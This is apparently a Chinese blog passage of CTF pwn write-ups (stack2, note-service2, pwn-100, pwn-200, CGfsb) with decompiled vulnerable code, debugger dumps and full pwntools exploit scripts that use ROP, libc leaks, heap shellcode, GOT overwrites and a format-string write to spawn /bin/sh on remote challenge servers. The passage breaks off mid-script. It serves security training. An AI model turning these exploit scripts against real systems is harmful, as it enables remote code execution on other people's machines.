返回地址在栈上位置</span></span><br><span class="line"> ESP  0xffffcf9c —▸ 0xf7e1d637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80488f2 (main+802) ◂— 0x669066c3</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80488f2 main+802</span><br><span class="line">   f 1 f7e1d637 __libc_start_main+247</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>写入地址在写入或者 show 操作汇编打断点，下面在录入时打断点找：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080486B</span>D                 call    ___isoc99_scanf</span><br><span class="line"><span class="number">080486</span>C2                 add     esp, <span class="number">10</span>h</span><br><span class="line"><span class="number">080486</span>C5                 mov     eax, [ebp+num]</span><br><span class="line"><span class="number">080486</span>CB                 mov     ecx, eax</span><br><span class="line"><span class="number">080486</span>CD                 lea     edx, [ebp+num_list]<span class="comment">//写入栈上</span></span><br><span class="line"><span class="number">080486</span>D0                 mov     eax, [ebp+var_7C]</span><br><span class="line"><span class="number">080486</span>D3                 add     eax, edx</span><br><span class="line"><span class="number">080486</span>D5                 mov     [eax], cl</span><br><span class="line"><span class="number">080486</span>D7                 add     [ebp+var_7C], <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>调试查看寄存器找到地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x56</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x56</span><br><span class="line"><span class="meta"> #</span><span class="bash">写入地址</span></span><br><span class="line"> EDX  0xffffcf18 ◂— 0x45 /* &#x27;E&#x27; */</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0xffffcf88 ◂— 0x0</span><br><span class="line"> ESP  0xffffcee0 —▸ 0xf7ffda74 —▸ 0xf7fd5470 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line"> EIP  0x80486d0 (main+256) ◂— 0x184458b</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x80486c2 &lt;main+242&gt;    add    esp, 0x10</span><br><span class="line">   0x80486c5 &lt;main+245&gt;    mov    eax, dword ptr [ebp - 0x88]</span><br><span class="line">   0x80486cb &lt;main+251&gt;    mov    ecx, eax</span><br><span class="line">   0x80486cd &lt;main+253&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line"> ► 0x80486d0 &lt;main+256&gt;    mov    eax, dword ptr [ebp - 0x7c]</span><br><span class="line">   0x80486d3 &lt;main+259&gt;    add    eax, edx</span><br><span class="line">   0x80486d5 &lt;main+261&gt;    mov    byte ptr [eax], cl</span><br><span class="line">   0x80486d7 &lt;main+263&gt;    add    dword ptr [ebp - 0x7c], 1</span><br><span class="line">   0x80486db &lt;main+267&gt;    mov    edx, dword ptr [ebp - 0x7c]</span><br><span class="line">   0x80486de &lt;main+270&gt;    mov    eax, dword ptr [ebp - 0x90]</span><br><span class="line">   0x80486e4 &lt;main+276&gt;    cmp    edx, eax</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>计算得出偏移：<code>0xffffcf9c</code>-<code>0xffffcf18</code>=<code>0x84</code></p>
<p><strong>后门函数只能本地打通，远程服务器没有 bash 指令。</strong>我就 ROP 和泄露 libc 地址了。看了大佬 wp 发现 <code>system(sh)</code>也能 getshell ，所以脚本如下：</p>
<p><strong>完整exp：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">42070</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,context</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;exit&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;change&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;number&quot;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;have:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x45</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x56</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_plt</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">9</span>,<span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">10</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">11</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h3><p>[collapse title=”展开查看详情” status=”false”]<br><strong>考点：堆上shellcode</strong></p>
<p>保护情况：NX 保护关闭</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>漏洞函数：存放堆指针的数组可越界存放。也就是堆指针可放置到任意地方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myadd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> chunk_size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )	<span class="comment">//chunk上限11个</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">      v1 = getinput();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">      result = getinput();</span><br><span class="line">      chunk_size = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);	<span class="comment">//堆指针存放可越界</span></span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        myread(qword_2020A0[v1], chunk_size);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序没有 NX 保护，可以将 shellcode 存放在堆上，然后通过数组越界覆盖 got 表调用 shellcode 。</p>
<p>程序限制堆大小不超过 8 ，且读入数据函数会占用最后一个字节写入 <code>\x00</code> 。可写入空间仅有 7 ，所以需要用汇编的跳转指令 <code>jnz short xxx</code> ，对应的十六进制为：<code>EB xx</code>，其中 <code>xx</code> 为偏移量。偏移量计算公式为：<code>xx = 目标地址 - 当前地址 -2</code></p>
<p>程序申请一个 size 为 8 的堆结构如下：<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/103003167">图源</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-L34hKzcbF5t0n8G3.png"></p>
<p>从 chunk 0 jmp 头开始计算：<code>xx</code>  = 2+1+8+8+8-2=0x19</p>
<p>构造一个调用 system 函数的shellcode ，然后数组越界覆盖一个可被控制输入参数的函数，例如 atoi ，传入参数 <code>/bin/sh\x00</code> 。这种构造方法要最后才修改 got 表，避免修改导致程序输入函数失效。</p>
<p>也可以到 shell-storm 找一个直接调用 <code>system(&#39;/bin/sh&#39;)</code> 的shellcode 一把梭哈。</p>
<p><strong>完整 exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encodeing:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">41618</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./note-service2&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#call system</span></span><br><span class="line">code0 = (asm(<span class="string">&#x27;xor rax,rax&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>) </span><br><span class="line">code1= (asm(<span class="string">&#x27;mov eax,0x3B&#x27;</span>) + <span class="string">&#x27;\xeb\x19&#x27;</span>)  </span><br><span class="line">code2 = (asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line">code3 = (asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>) </span><br><span class="line">code4 = (asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">shellcode0 = <span class="string">&quot;\x01\x30\x8f\xe2&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode1 = <span class="string">&quot;\x13\xff\x2f\xe1&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode2 = <span class="string">&quot;\x78\x46\x0e\x30&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode3 = <span class="string">&quot;\x01\x90\x49\x1a&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode4 = <span class="string">&quot;\x92\x1a\x08\x27&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode5 = <span class="string">&quot;\xc2\x51\x03\x37&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode6 = <span class="string">&quot;\x01\xdf\x2f\x62&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode7 = <span class="string">&quot;\x69\x6e\x2f\x2f&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode8 = <span class="string">&quot;\x73\x68&quot;</span> + <span class="string">&#x27;\x90\x90\x90\x90\x90&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write shellcode </span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,code1)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>,code2)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">8</span>,code3)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">8</span>,code4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite atoi@got.plt</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(-<span class="number">8</span>,<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line"><span class="comment">#send /bin/sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>[/collapse]</p>
<h3 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h3><p>[collapse title=”展开查看详情” status=”false”]<br><strong>考点：栈溢出、ROP</strong></p>
<p>这个栈溢出每次固定要求输入 200 个字符，也没有别的了。</p>
<p>ROP 操作也不需要往 bss 写入 /bin/sh ，直接在 libc 找一个就好了。（看到网上有这样的操作orz）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;124.126.19.106&#x27;</span>,<span class="number">35604</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn-100&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn-100&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400763</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak puts@got.plt</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">puts_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#call system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h3><p>[collapse title=”展开查看详情” status=”false”]<strong>考点：栈溢出、泄露地址</strong></p>
<p>漏洞函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可操作空间空间很长就不需要什么骚操作了。就是没给 libc 文件，需要去<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database</a> 查一下而已。查到的话是这个：libc6-i386_2.23-0ubuntu11_amd64.so</p>
<p>完整 exp ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;159.138.137.79&quot;</span>,<span class="number">55989</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6-i386_2.23-0ubuntu11_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080483D0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_leak = u32(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>,drop=<span class="number">1</span>))</span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system) + p32(main_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p>考点：写入小数字格式化字符串</p>
<p>完整 exp ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">59528</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./CGfsb&quot;)</span></span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line">payload = <span class="string">&quot;%8c%12$n&quot;</span> + p32(pwnme)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span 